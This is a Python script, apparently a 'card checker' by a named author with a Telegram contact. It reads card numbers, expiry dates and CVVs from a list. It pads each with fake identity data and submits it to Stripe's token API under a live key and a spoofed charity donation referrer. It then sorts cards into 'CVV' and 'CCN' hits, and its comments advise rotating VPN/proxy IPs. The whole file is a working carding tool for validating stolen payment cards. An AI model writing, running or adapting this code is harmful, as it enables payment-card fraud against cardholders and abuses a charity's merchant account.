


import os
import json
import requests

#Made By Bheemesh


succcess = open("cvc.txt", "a")
checked = open("checkcards.txt", "a")
othercards = open("othercards.txt", "a")

def getnumber():
    read = open("num.txt","r")
    lines = read.readlines()
    num = int(lines[0])
    return num


def increment():
    read = open("num.txt","r")

    lines = read.readlines()
    num = int(lines[0])
    num = num +1
    write = open("num.txt", "w")
    write.write(str(num))
    read.close()
    write.close()

def decrement():
    read = open("num.txt", "r")

    lines = read.readlines()
    num = int(lines[0])
    num = num - 1
    write = open("num.txt", "w")
    write.write(str(num))
    read.close()
    write.close()

def randomizer(): #This is to randomize the request content
    randomocontent = requests.get('https://randomuser.me/api/1.2/?nat=us')
    jsonrandom = randomocontent.json()
    return jsonrandom


def checker(cc,jsonrandom):
    splitter = cc.split('|')
    ccnum = splitter[0]
    month = splitter[1]
    year = splitter[2]
    cvv = splitter[3]

    muid = '14bec475-2279-4ba5-87ce-1b4c2bf2dd04'
    sid = '731a3414-ff88-440a-b64e-f77a878f71b2'

    firstname = jsonrandom["results"][0]["name"]["first"]

    lastname = jsonrandom["results"][0]["name"]["last"]
    street = jsonrandom["results"][0]["location"]["street"]

    city = jsonrandom["results"][0]["location"]["city"]

    postcode = jsonrandom["results"][0]["location"]["postcode"]

    email = jsonrandom["results"][0]["email"]

    state = jsonrandom["results"][0]["location"]["state"]

    url  = 'https://api.stripe.com/v1/tokens'
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'origin': 'https://checkout.stripe.com',
        'sec-fetch-dest': 'empty',
        'accept-language': 'en-GB',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'referer': 'https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=31d5b0c4-70c8-d34b-8f08-71046ff10298',
    }

    data = {
    'email': email,
    'validation_type': 'card',
    'payment_user_agent': 'Stripe Checkout v3 checkout-manhattan (stripe.js/a44017d)',
    'referrer': 'https://www.tangaroablue.org/about-us/donate/',
    'pasted_fields': 'number',
    'card[number]': ccnum,
    'card[exp_month]': month,
    'card[exp_year]': year,
    'card[cvc]': cvv,
    'card[name]': firstname,
    'card[address_line1]': street,
    'card[address_city]': city ,
    'card[address_state]': state,
    'card[address_zip]': postcode,
    'card[address_country]': 'United States',
    'time_on_page': '132527',
    'guid': 'NA',
    'muid': muid,#'9765dc7f-a003-43fb-9999-5602351ba3cc',
    'sid':  sid,#'6a909e32-d576-4bac-bf88-5372ac3e3ead',
    'key': 'pk_live_eBee6q6n88Q6DCAatTPCOycn00XBRXLwKV'
    }
    responser = requests.post(url,headers=headers,data=data)
    jsonrespone = responser.json()
    if(responser.status_code == 200):
        #print("CC is Valid")
        if(jsonrespone["card"]["cvc_check"] == "unavailable"):
            print("Proxy Error - Chnage your IP and restart the checker")
            decrement()



        #CHECKING IF THE CARD HAS THE CORRECT CVC
        elif(jsonrespone["card"]["cvc_check"] == "pass"):
            checked.write(cc)
            checked.write('\n')
            print("CVC CHECK PASS")
            succcess.write("CVV"+"-----"+str(cc))
            succcess.write(responser.text)

            print(cc)

        #This means the Proxy is Dead (Change the IP of your VPN)
        elif(jsonrespone["card"]["cvc_check"] == "unchecked"):
            print("Proxy Error - Change your IP and restart the checker")
            decrement() # Since this card has not been Checked , the Checked list count will decrement
            #By this way no card in the list will be left unchecked.


        #print(jsonrespone["card"]["cvc_check"])
        #print(cc)
        #print(jsonrespone)


    elif (responser.status_code == 402):
        if(jsonrespone["error"]["code"] == "incorrect_cvc"):
            print("CCN Found - " + str(cc))
            checked.write(cc)
            checked.write('\n')
            #succcess.write(cc)
            succcess.write("CCN"+"-"+str(cc))
            succcess.write(responser.text)
            succcess.write("--------------------------------------------------------------------------")
        elif(jsonrespone["error"]["code"] == "card_declined"):
            print("Card Declined - "+str(cc))
            checked.write(cc)
            checked.write('\n')
            othercards.write(cc)
            othercards.write(responser.text)
            othercards.write("------------------------------------------------------------------------")
        elif(jsonrespone["error"]["code"] == "expired_card"):
            checked.write(cc)
            checked.write('\n')
            print("Expired Card - "+str(cc))


    #print(jsonrespone)


#Driver Program


def main():
    cards  = 100 #Update this variable with the number of cards you want to Check
    f = open('list.txt', 'r')
    lines = f.readlines()
    num = getnumber()
    f.close()

    for x in range(0,cards): #Getting each Card from the list.txt
        cc = lines[num]
        cc = cc[0:28]
        checker(cc,randomizer())
        increment() #This is to Increment the CC count
        print('--------------------------------------------------------------------'+str(num)+'------------------------------------------')
        num = num + 1

def addsuccess(text):
    success = open("cvc.txt","a")
    success.write(text)
    success.close()


main()


#-----------------------------------------Made By Bheemesh----------------------------------------------------------------------
#Telegram ID : @hellosre
#Telegram ID : @hellosre

